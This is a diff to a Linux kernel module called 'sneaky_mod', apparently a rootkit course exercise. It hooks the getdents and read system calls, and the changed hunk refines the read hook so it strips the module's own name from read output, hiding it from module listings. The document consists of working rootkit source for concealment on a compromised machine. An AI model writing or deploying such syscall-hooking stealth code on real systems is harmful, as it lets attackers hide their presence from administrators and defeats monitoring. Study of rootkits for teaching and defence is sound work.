@@ -15,6 +15,7 @@ MODULE_AUTHOR("Hongliang Dong");
 static char* process_id = "";
 module_param(process_id, charp, 0);
 
+
 struct linux_dirent {
   long d_ino;
   off_t d_off;
@@ -84,7 +85,6 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,un
 }
 
 
-
 asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
 
 asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
@@ -92,17 +92,17 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
   char* start;
   char* end;
   if(nread>0){
-    start = strstr(buf,"sneaky_mod");
+    start = strnstr(buf,"sneaky_mod ",nread);
     if(start != NULL){
-      end = strstr(start,"\n");
+      end = strnstr(start,"\n",nread-(start-(char*)buf));
       if(end != NULL){
         end++;
-        memmove(start,end,(char*)buf + nread - end);
+        memmove(start,end, (char __user *)buf + nread - end);
         nread -= (end-start);
       }
     }
   }
-  return (ssize_t)nread;
+  return nread;
 }
 
 
@@ -171,4 +171,3 @@ static void exit_sneaky_module(void)
 
 module_init(initialize_sneaky_module);  // what's called upon loading 
 module_exit(exit_sneaky_module);        // what's called upon unloading  
-
